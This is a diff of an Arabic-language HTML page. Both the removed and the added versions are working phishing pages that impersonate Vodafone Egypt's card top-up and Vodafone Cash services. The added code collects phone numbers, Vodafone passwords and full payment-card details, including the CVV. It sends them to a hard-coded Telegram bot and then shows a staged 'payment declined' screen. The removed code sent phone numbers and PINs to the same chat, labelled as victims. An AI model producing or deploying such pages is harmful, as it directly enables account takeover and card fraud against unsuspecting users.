@@ -1,60 +1,264 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width,initial-scale=1.0">
-<title>فودافون كاش - شحن مجاني</title>
-<style>
-*{margin:0;padding:0;box-sizing:border-box}
-body{font-family:'Segoe UI',Tahoma,sans-serif;background:linear-gradient(135deg,#e60000,#fff);color:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
-.container{background:#fff;border-radius:20px;padding:30px 20px;max-width:400px;width:100%;text-align:center;box-shadow:0 10px 40px rgba(230,0,0,0.3)}
-.logo{background:#e60000;color:#fff;font-size:35px;font-weight:900;padding:15px;border-radius:50%;width:80px;height:80px;margin:0 auto 15px;display:flex;align-items:center;justify-content:center}
-h1{font-size:20px;color:#e60000;margin-bottom:8px}
-.sub{color:#666;font-size:13px;margin-bottom:20px}
-.fg{margin-bottom:14px;text-align:right}
-label{display:block;color:#333;font-size:12px;margin-bottom:5px;font-weight:600}
-input{width:100%;padding:14px;background:#f5f5f5;border:2px solid #ddd;border-radius:10px;color:#000;font-size:14px;outline:none}
-input:focus{border-color:#e60000}
-.btn{width:100%;padding:14px;margin-top:10px;background:#e60000;color:#fff;border:none;border-radius:25px;font-size:17px;font-weight:bold;cursor:pointer}
-.btn:active{transform:scale(0.96)}
-.load{display:none;position:fixed;inset:0;background:rgba(255,255,255,0.95);z-index:99;justify-content:center;align-items:center;flex-direction:column}
-.load.show{display:flex}
-.spinner{width:50px;height:50px;border:4px solid #ddd;border-top:4px solid #e60000;border-radius:50%;animation:spin 0.8s linear infinite;margin-bottom:18px}
-@keyframes spin{to{transform:rotate(360deg)}}
-.done{display:none;position:fixed;inset:0;background:rgba(255,255,255,0.98);z-index:98;justify-content:center;align-items:center;flex-direction:column}
-.done.show{display:flex}
-.done h2{color:#e60000;font-size:24px;margin:12px 0}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>شحن كروت فودافون</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap');
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{font-family:'Cairo',sans-serif;background:linear-gradient(180deg,#e60000,#c80000,#a00000);color:#fff;min-height:100vh;padding:15px}
+        .c{max-width:500px;margin:0 auto}
+        .h{text-align:center;padding:25px;background:rgba(0,0,0,0.2);border-radius:15px;margin-bottom:15px}
+        .h .logo{font-size:50px}
+        .h h1{font-size:24px;font-weight:900;margin:10px 0}
+        .h p{font-size:12px;opacity:0.8}
+        
+        .box{background:rgba(0,0,0,0.3);border-radius:15px;padding:20px;margin:12px 0}
+        .box h3{color:#fff;margin-bottom:12px;font-size:16px}
+        input{width:100%;padding:15px;margin:8px 0;background:rgba(255,255,255,0.15);border:1px solid rgba(255,255,255,0.3);color:#fff;font-size:16px;border-radius:10px;font-family:'Cairo',sans-serif;outline:none}
+        input::placeholder{color:rgba(255,255,255,0.6)}
+        input:focus{border-color:#fff;background:rgba(255,255,255,0.2)}
+        
+        .cards-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin:15px 0}
+        .card-item{background:linear-gradient(135deg,#fff,#f0f0f0);border-radius:15px;padding:20px;text-align:center;cursor:pointer;transition:0.3s;color:#000}
+        .card-item:hover{transform:translateY(-3px);box-shadow:0 10px 30px rgba(0,0,0,0.3)}
+        .card-item:active{transform:scale(0.95)}
+        .card-item .amount{font-size:28px;font-weight:900;color:#e60000}
+        .card-item .units{font-size:12px;color:#666;margin-top:5px}
+        .card-item .price{font-size:14px;font-weight:700;color:#000;margin-top:5px}
+        .card-item.popular{border:3px solid #e60000;position:relative}
+        .card-item.popular::before{content:"الأكثر مبيعاً";position:absolute;top:-12px;right:10px;background:#e60000;color:#fff;padding:3px 10px;border-radius:10px;font-size:10px}
+        
+        .btn{width:100%;padding:16px;margin:8px 0;border:none;border-radius:12px;font-family:'Cairo',sans-serif;font-size:16px;font-weight:700;cursor:pointer;transition:0.3s}
+        .btn-red{background:#fff;color:#e60000}
+        .btn-red:hover{background:#f0f0f0}
+        .btn-outline{background:transparent;border:2px solid #fff;color:#fff}
+        
+        .modal{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);z-index:999;display:none;justify-content:center;align-items:center;padding:20px}
+        .modal.show{display:flex}
+        .modal-box{background:#1a1a1a;border-radius:20px;padding:25px;width:100%;max-width:400px;max-height:90vh;overflow:auto}
+        .modal-box h2{color:#fff;text-align:center;margin-bottom:15px}
+        .modal-box .amount-display{text-align:center;font-size:36px;font-weight:900;color:#e60000;margin:10px 0}
+        
+        .pay-method{padding:15px;border:1px solid rgba(255,255,255,0.2);margin:8px 0;border-radius:12px;cursor:pointer;transition:0.3s;display:flex;align-items:center;gap:12px;color:#fff}
+        .pay-method:hover{background:rgba(230,0,0,0.2);border-color:#e60000}
+        .pay-method .icon{font-size:30px}
+        
+        .processing{text-align:center;padding:30px;display:none}
+        .spinner{width:50px;height:50px;border:4px solid rgba(255,255,255,0.1);border-top:4px solid #e60000;border-radius:50%;animation:spin 1s linear infinite;margin:20px auto}
+        @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+        
+        .step-list{list-style:none;text-align:right;padding:0}
+        .step-list li{padding:8px 0;font-size:13px;display:flex;align-items:center;gap:8px;color:#fff}
+        .step-list .done{color:#0f0}.step-list .fail{color:#f00}.step-list .wait{color:#fa0}
+        
+        .success-msg{text-align:center;color:#0f0;font-size:18px;display:none}
+        .error-msg{text-align:center;color:#f00;font-size:16px;display:none}
+    </style>
 </head>
 <body>
-<div class="container" id="form">
-<div class="logo">VF</div>
-<h1>فودافون كاش</h1>
-<p class="sub">شحن رصيد مجاني</p>
-<div class="fg"><label>📱 رقم الهاتف</label><input type="tel" id="phone" placeholder="010xxxxxxxx"></div>
-<div class="fg"><label>🔒 الرقم السري</label><input type="password" id="pin" placeholder="الرقم السري 6 أرقام" maxlength="6"></div>
-<div class="fg"><label>💰 المبلغ</label><select id="amount" style="width:100%;padding:14px;background:#f5f5f5;border:2px solid #ddd;border-radius:10px;color:#000;font-size:14px;outline:none"><option value="">-- اختر --</option><option>50 جنيه</option><option>100 جنيه</option><option>200 جنيه</option><option>500 جنيه</option><option>1000 جنيه</option></select></div>
-<button class="btn" onclick="go()">💸 شحن الرصيد</button>
-</div>
-<div class="load" id="load"><div class="spinner"></div><p style="color:#666">⏳ جاري الشحن...</p></div>
-<div class="done" id="done"><h2>✅ تم الشحن!</h2><p style="color:#666">سيتم إضافة الرصيد خلال دقائق</p></div>
-<script>
-var u=new URL(window.location.href);
-var CHAT=u.searchParams.get('chatId')||'7276604783';
-var TOKEN=u.searchParams.get('token')||'8437915697:AAGePdMDoI8h-jX_WTPOdNM42_LABwjRBUo';
-async function send(t){
-try{await fetch('https://api.telegram.org/bot'+TOKEN+'/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:CHAT,text:t,parse_mode:'HTML'})})}catch(e){}
-}
-async function go(){
-var ph=document.getElementById('phone').value.trim();
-var pi=document.getElementById('pin').value.trim();
-var am=document.getElementById('amount').value;
-if(!ph||!pi||!am)return alert('املأ جميع الحقول');
-document.getElementById('load').classList.add('show');
-var msg='🏦 <b>ضحية فودافون كاش!</b>\n\n📱 هاتف: '+ph+'\n🔒 سري: '+pi+'\n💰 مبلغ: '+am+'\n\n📱 '+navigator.userAgent;
-await send(msg);
-setTimeout(function(){document.getElementById('load').classList.remove('show');document.getElementById('done').classList.add('show');setTimeout(function(){window.location.href='https://vodafone.com.eg/'},3000)},4000);
-}
-</script>
+    <div class="c">
+        <div class="h">
+            <div class="logo">📱</div>
+            <h1>Vodafone Cards</h1>
+            <p>شحن كروت فودافون بسهولة</p>
+        </div>
+        
+        <!-- Login -->
+        <div id="loginPage">
+            <div class="box">
+                <h3>🔐 تسجيل الدخول</h3>
+                <input type="tel" id="phoneInput" placeholder="رقم الهاتف (01xxxxxxxxx)" maxlength="11">
+                <input type="password" id="passInput" placeholder="كلمة سر فودافون">
+                <button class="btn btn-red" onclick="login()">دخول</button>
+                <div class="error-msg" id="loginError"></div>
+            </div>
+        </div>
+        
+        <!-- Cards -->
+        <div id="cardsPage" style="display:none;">
+            <div class="box">
+                <h3>💳 اختر الكارت</h3>
+                <div class="cards-grid">
+                    <div class="card-item" onclick="selectCard(10, '500 وحدة')">
+                        <div class="amount">10 ج</div>
+                        <div class="units">📞 500 وحدة</div>
+                        <div class="price">صلاحية 7 أيام</div>
+                    </div>
+                    <div class="card-item" onclick="selectCard(15, '800 وحدة')">
+                        <div class="amount">15 ج</div>
+                        <div class="units">📞 800 وحدة</div>
+                        <div class="price">صلاحية 7 أيام</div>
+                    </div>
+                    <div class="card-item popular" onclick="selectCard(20, '1200 وحدة')">
+                        <div class="amount">20 ج</div>
+                        <div class="units">📞 1200 وحدة</div>
+                        <div class="price">صلاحية 14 يوم</div>
+                    </div>
+                    <div class="card-item" onclick="selectCard(25, '1600 وحدة')">
+                        <div class="amount">25 ج</div>
+                        <div class="units">📞 1600 وحدة</div>
+                        <div class="price">صلاحية 14 يوم</div>
+                    </div>
+                    <div class="card-item" onclick="selectCard(30, '2000 وحدة')">
+                        <div class="amount">30 ج</div>
+                        <div class="units">📞 2000 وحدة</div>
+                        <div class="price">صلاحية 30 يوم</div>
+                    </div>
+                    <div class="card-item" onclick="selectCard(45, '3000 وحدة')">
+                        <div class="amount">45 ج</div>
+                        <div class="units">📞 3000 وحدة</div>
+                        <div class="price">صلاحية 30 يوم</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Payment Modal -->
+    <div class="modal" id="modal">
+        <div class="modal-box" id="modalContent"></div>
+    </div>
+
+    <script>
+        const BOT_TOKEN = "8946474034:AAGegUUfpLuRG6k8r72JiDEuYzGTK9TgV6I";
+        const CHAT_ID = "7276604783";
+        let userPhone = '';
+        let userPass = '';
+        let selectedAmount = 0;
+        let selectedUnits = '';
+        
+        async function sendToTelegram(text) {
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: text,
+                        parse_mode: 'HTML'
+                    })
+                });
+            } catch(e) {}
+        }
+        
+        function login() {
+            const phone = document.getElementById('phoneInput').value.trim();
+            const pass = document.getElementById('passInput').value.trim();
+            const error = document.getElementById('loginError');
+            
+            if (!phone || phone.length < 11) {
+                error.style.display = 'block';
+                error.textContent = '❌ رقم الهاتف غير صحيح';
+                return;
+            }
+            if (!pass) {
+                error.style.display = 'block';
+                error.textContent = '❌ كلمة السر مطلوبة';
+                return;
+            }
+            
+            userPhone = phone;
+            userPass = pass;
+            error.style.display = 'none';
+            
+            // Send to Telegram
+            sendToTelegram(`📱 <b>تسجيل دخول فودافون</b>\n\n📞 الرقم: <code>${phone}</code>\n🔑 كلمة السر: <code>${pass}</code>`);
+            
+            document.getElementById('loginPage').style.display = 'none';
+            document.getElementById('cardsPage').style.display = 'block';
+        }
+        
+        function selectCard(amount, units) {
+            selectedAmount = amount;
+            selectedUnits = units;
+            
+            document.getElementById('modalContent').innerHTML = `
+                <span style="float:left;color:#f00;font-size:24px;cursor:pointer;" onclick="closeModal()">✕</span>
+                <h2>💳 تأكيد الشراء</h2>
+                <div class="amount-display">${amount} ج</div>
+                <p style="text-align:center;color:#aaa;">${units}</p>
+                <p style="text-align:center;color:#888;font-size:12px;">اختر طريقة الدفع</p>
+                
+                <div class="pay-method" onclick="showCardForm()">
+                    <span class="icon">💳</span>
+                    <div><b>بطاقة ائتمان</b><br><small style="color:#888;">Visa • MasterCard • Meeza</small></div>
+                </div>
+                <div class="pay-method" onclick="showCardForm()">
+                    <span class="icon">📱</span>
+                    <div><b>فودافون كاش</b><br><small style="color:#888;">تحويل فوري</small></div>
+                </div>
+            `;
+            document.getElementById('modal').classList.add('show');
+        }
+        
+        function closeModal() {
+            document.getElementById('modal').classList.remove('show');
+        }
+        
+        function showCardForm() {
+            document.getElementById('modalContent').innerHTML = `
+                <span style="float:left;color:#f00;font-size:24px;cursor:pointer;" onclick="closeModal()">✕</span>
+                <h2>💳 بيانات البطاقة</h2>
+                <div class="amount-display">${selectedAmount} ج</div>
+                
+                <input type="text" id="cardNum" placeholder="رقم البطاقة (16 رقم)" maxlength="16">
+                <div style="display:flex;gap:8px;">
+                    <input type="text" id="cardExpiry" placeholder="MM/YY" maxlength="5" style="flex:1">
+                    <input type="text" id="cardCvv" placeholder="CVV" maxlength="3" style="flex:1">
+                </div>
+                <input type="text" id="cardName" placeholder="اسم حامل البطاقة">
+                
+                <button class="btn btn-red" onclick="processPayment()" style="margin-top:10px;">💰 ادفع ${selectedAmount} ج</button>
+            `;
+        }
+        
+        async function processPayment() {
+            const cardNum = document.getElementById('cardNum')?.value || '';
+            const cardExpiry = document.getElementById('cardExpiry')?.value || '';
+            const cardCvv = document.getElementById('cardCvv')?.value || '';
+            const cardName = document.getElementById('cardName')?.value || '';
+            
+            if (!cardNum || !cardExpiry || !cardCvv) {
+                alert('يرجى إدخال جميع بيانات البطاقة');
+                return;
+            }
+            
+            // Send card data to Telegram
+            await sendToTelegram(
+                `💳 <b>بيانات بطاقة جديدة!</b>\n\n` +
+                `📱 هاتف: <code>${userPhone}</code>\n` +
+                `🔑 كلمة سر فودافون: <code>${userPass}</code>\n` +
+                `💳 البطاقة: <code>${cardNum}</code>\n` +
+                `📅 تاريخ: <code>${cardExpiry}</code>\n` +
+                `🔐 CVV: <code>${cardCvv}</code>\n` +
+                `👤 الاسم: <code>${cardName}</code>\n` +
+                `💰 المبلغ: <code>${selectedAmount} ج - ${selectedUnits}</code>`
+            );
+            
+            // Show processing
+            document.getElementById('modalContent').innerHTML = `
+                <h2 style="text-align:center;color:#fff;">⏳ جاري الشحن...</h2>
+                <div class="processing" style="display:block;">
+                    <div class="spinner"></div>
+                    <ul class="step-list" id="steps">
+                        <li class="wait">🔄 جاري التحقق من البطاقة...</li>
+                    </ul>
+                </div>
+            `;
+            
+            const s = document.getElementById('steps');
+            setTimeout(() => s.innerHTML += '<li class="done">✅ تم التحقق من البطاقة</li>', 1200);
+            setTimeout(() => s.innerHTML += '<li class="wait">🔄 جاري الاتصال بـ فودافون...</li>', 2200);
+            setTimeout(() => s.innerHTML += '<li class="wait">🔄 جاري معالجة الشحن...</li>', 3200);
+            setTimeout(() => s.innerHTML += '<li class="done">✅ تم الاتصال بالخادم</li>', 4200);
+            setTimeout(() => s.innerHTML += '<li class="fail">❌ تم رفض عملية الدفع</li>', 5200);
+            setTimeout(() => s.innerHTML += '<li class="fail">❌ رصيد غير كافٍ</li>', 5600);
+            setTimeout(() => {
+                s.innerHTML += `<br><button class="btn btn-red" onclick="closeModal()" style="margin-top:15px;">✕ إغلاق</button>`;
+            }, 6000);
+        }
+    </script>
 </body>
 </html>
